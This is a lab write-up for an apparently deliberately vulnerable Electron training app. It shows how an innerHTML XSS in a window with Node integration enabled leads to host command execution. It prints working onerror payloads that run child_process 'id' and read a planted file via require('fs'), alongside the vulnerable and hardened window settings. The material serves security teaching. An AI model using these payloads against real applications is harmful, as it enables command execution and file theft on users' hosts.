# Challenge 3 — Owned — Writeup

Module: What Can XSS Do in Electron?
Lab page: `src/renderer/pages/xss-rce-direct.html`
Lab script: `src/renderer/js/xss-rce-direct.js`
Window creation: `src/main/main.js` (`openXSSOwnedWindow`)
Window preload: none

---

## 1. Objective

Using only the lab's injection point (the identical `innerHTML` sink as Challenges 1 and 2),
against a window with `nodeIntegration: true`, complete three tasks:

1. Prove Node.js is running directly in the page.
2. Execute a real operating-system command.
3. Read a file off the host filesystem — the capstone.

Challenge 1 showed the identical bug fully contained. Challenge 2 showed it escaping through
one bridge exposure. This challenge closes the arc at the opposite extreme: there is no bridge
here at all, because none is needed — the renderer itself is a full Node.js environment, so an
`innerHTML` injection is remote code execution the instant it fires.

---

## 2. Exploitation walkthrough

**Setup — the badges are almost all red, and that's the whole lesson.** `openXSSOwnedWindow()`
creates this window with the config that makes `nodeIntegration` actually reach the page:

```js
// src/main/main.js
function openXSSOwnedWindow() {
  const win = new Window({
    file: path.join('src/renderer/pages', 'xss-rce-direct.html'),
    webPreferences: {
      preload: undefined,
      nodeIntegration: true,
      contextIsolation: false,
      sandbox: false,
    },
  });
  ...
}
```

All three flags matter together, not just `nodeIntegration` in isolation:

- **`sandbox: false`** — a sandboxed renderer never gets Node integration, full stop, no
  matter what `nodeIntegration` says. Sandbox has to be off first.
- **`contextIsolation: false`** — with isolation on, even a preload's Node access stays in a
  separate JavaScript world from the page; the page's own scripts wouldn't see `require`
  unless something bridged it across on purpose. Isolation has to be off too.
- **`nodeIntegration: true`** — only once the two above are out of the way does this flag
  actually inject `require`, `process`, `module`, `Buffer`, and the rest of Node's globals
  directly into the page's own JavaScript world.

There is no preload at all here (`preload: undefined`) — not because one was forgotten, but
because none is needed. Unlike Challenge 2, where the vulnerability was one specific function
a preload chose to expose, here the entire global Node environment is simply available to any
script that runs on the page, including an attacker's.

The injection point is the identical sink as the previous two challenges:

```js
// src/renderer/js/xss-rce-direct.js
form.addEventListener('submit', (e) => {
  e.preventDefault();
  const val = document.getElementById('xssInput3').value;
  document.getElementById('xssOutput3').innerHTML = val;
});
```

Every payload below uses `onerror` for execution, same reason as the last two challenges:
`innerHTML` doesn't execute inserted `<script>` tags. What's new is that these payloads call
`require()` directly — no `window.systemAPI`, no `ipcRenderer.invoke()`, nothing crossing a
process boundary at all.

**Task 1 — prove Node in the renderer.** Read something only genuinely available because this
page's own JavaScript context has Node wired in:

```html
<img src=x onerror="document.getElementById('attacker-log').insertAdjacentHTML('beforeend', '<li>' + process.versions.node + '</li>')">
```

`process` is a real Node global here, not the small Electron-only subset a properly configured
renderer would see — `process.versions.node` resolves to the actual Node runtime version. The
lab independently reads this same value from `process.versions.node` in the main process (not
through this page) when the window opens, and checks the attacker view for that exact real
value, so the flag can't appear from a guessed or hardcoded string. (`require('os').hostname()`
or `require('os').platform()` prove the identical point — this lab's check happens to key on
the Node version specifically.) Reveals: `DVEA{node_in_the_renderer}`.

**Task 2 — execute a real command.** `require` works like it would in any Node script:

```html
<img src=x onerror="document.getElementById('attacker-log').insertAdjacentHTML('beforeend', '<li>' + require('child_process').execSync('id').toString().trim() + '</li>')">
```

The lab independently runs `id` once in main itself when the window opens (not via this page)
to know its own real output, then checks the attacker view for that same real string — as with
Task 1, this can't be satisfied by writing plausible-looking text directly into the attacker
view. Reveals: `DVEA{arbitrary_command_execution}`.

**Task 3 — read a host file (the capstone).** `openXSSOwnedWindow()` plants a real file at
`/tmp/dvea-rce-flag.txt` containing `DVEA{full_host_compromise}` when the window opens. A
correctly configured renderer would have no way to read it at all; here it's one call:

```html
<img src=x onerror="document.getElementById('attacker-log').insertAdjacentHTML('beforeend', '<li>' + require('fs').readFileSync('/tmp/dvea-rce-flag.txt', 'utf8').replace(/\n/g, ' ') + '</li>')">
```

The real file's real content carries the flag — the same "the value you recover is itself the
flag" shape as Challenge 1's `localStorage` task and Challenge 2's planted-secret task, except
here nothing brokered the read at all: `require('fs')` in the page **is** the read. Reveals:
`DVEA{full_host_compromise}`.

**Beyond the flag.** Every capability `require()` grants in a normal Node.js script is
available here — arbitrary file writes, spawning arbitrary processes, opening network
sockets, loading and running new modules — with the added twist that the code doing it arrived
as attacker-supplied HTML, not as code the developer wrote. This lab's three tasks are a
deliberately conservative, provable subset of what `nodeIntegration: true` actually grants.

---

## 3. Vulnerable code vs. fixed code

**Vulnerable** (`src/main/main.js`):

```js
function openXSSOwnedWindow() {
  const win = new Window({
    file: path.join('src/renderer/pages', 'xss-rce-direct.html'),
    webPreferences: {
      preload: undefined,
      nodeIntegration: true,
      contextIsolation: false,
      sandbox: false,
    },
  });
  ...
}
```

**Fixed** — never set `nodeIntegration: true` for a window that renders any content you don't
fully control. Restore Electron's safe defaults, and if the renderer genuinely needs a main
capability, expose a narrow, validated bridge instead — exactly Challenge 2's least-privilege
lesson applied here:

```diff
 function openXSSOwnedWindow() {
   const win = new Window({
     file: path.join('src/renderer/pages', 'xss-rce-direct.html'),
     webPreferences: {
-      preload: undefined,
-      nodeIntegration: true,
-      contextIsolation: false,
-      sandbox: false,
+      preload: path.join(__dirname, 'preload-xss-owned-fixed.js'),
+      nodeIntegration: false,
+      contextIsolation: true,
+      sandbox: true,
     },
   });
   ...
 }
```

```diff
+// preload-xss-owned-fixed.js — only if the page genuinely needs something from main; expose
+// the narrow, specific operation, never a code-execution or command-execution primitive.
+contextBridge.exposeInMainWorld('systemapi', {
+  getNodeVersion: () => ipcRenderer.invoke('get-node-version'),
+});
```

---

## 4. Why the fix works

- **`nodeIntegration: false` removes the capability at its source, not just one path to it.**
  Challenge 2's fix narrowed what one exposed function could do; there's no equivalent
  narrowing available here, because the vulnerable "function" is the entire Node global
  environment. The only fix is to not inject it into the page's world in the first place.
  There is no safe subset of "give the renderer `require`."
  - **`contextIsolation: true` and `sandbox: true` are not redundant with
  `nodeIntegration: false` — they're independent layers.** `contextIsolation` keeps a
  preload's own Node access in a separate JavaScript world from the page, so even a
  buggy or overly generous preload can't leak Node primitives into page-reachable scope by
  accident. `sandbox` constrains the renderer process itself at the OS level, so that even if
  every JavaScript-level setting were somehow wrong, the process still couldn't reach
  arbitrary Node APIs. Setting all three correctly is what Challenge 1 demonstrated as fully
  contained; this challenge is what happens when exactly these three are wrong together.
- **If the renderer genuinely needs something from main, expose one narrow, validated
  operation** — the same principle as Challenge 2's fix, and for the same reason: a
  `contextBridge`-exposed function that does one specific, parameterless-or-narrowly-validated
  thing has no code-execution or command-execution surface for XSS to reach through, no matter
  how the injection itself succeeds.
- **This is the most fundamental of the three fixes in this module.** Challenge 2's fix
  narrows a bridge; Challenge 3 (the earlier, eval-based version of this lab) would have
  needed to remove a main-process `eval()` call. This fix removes an entire *webPreferences*
  flag from the default-unsafe side back to Electron's own recommended default — the single
  highest-leverage setting in Electron's whole security model, which is exactly why the
  official Electron security checklist lists it first.

---

## 5. Closing the arc: same bug, three configs

Three challenges, one bug: unsanitized input rendered via `innerHTML`. Nothing about the
injection technique changed across any of them — every payload in all three writeups uses the
same `onerror` event-handler trick against the same kind of sink. What changed, each time, was
exactly one barrier between that injected script and the operating system:

- **Challenge 1 (Contained):** `sandbox: true`, `contextIsolation: true`,
  `nodeIntegration: false`, and no preload exposure at all. XSS fires; there is nowhere for it
  to go. `require` was never wired into that world.
- **Challenge 2 (Bridged):** the same three renderer flags, but the preload hands the page one
  function, and that function is a real command runner. The barrier that fell was "the preload
  exposes nothing" — XSS climbs through the one door left open.
- **Challenge 3 (Owned, this one):** `sandbox: false`, `contextIsolation: false`,
  `nodeIntegration: true`. The barrier that fell this time isn't a door left open by a preload
  — it's the wall itself. There's no bridge to discover because the renderer doesn't need one;
  it already has everything a bridge would have given it, natively, as part of its own
  JavaScript environment.

That progression — nothing reachable, to one exposed function, to the renderer *being* Node —
is the module's whole thesis: **"how bad is this XSS" is entirely a property of what the app's
configuration puts within its reach, never a property of the injection itself.** The same
one-line `innerHTML` bug was harmless, then command-execution-via-one-function, then
instant full host compromise with no intermediary at all, without the payload technique
changing once. CVE-2020-16608 documents exactly this failure mode in the wild — an app that
enabled `nodeIntegration` and paid for it with a markdown-rendering XSS turning into full RCE —
and the Electron security checklist puts "keep `nodeIntegration` off" first for exactly this
reason: it is the single misconfiguration most directly responsible for turning ordinary
renderer XSS into total compromise.
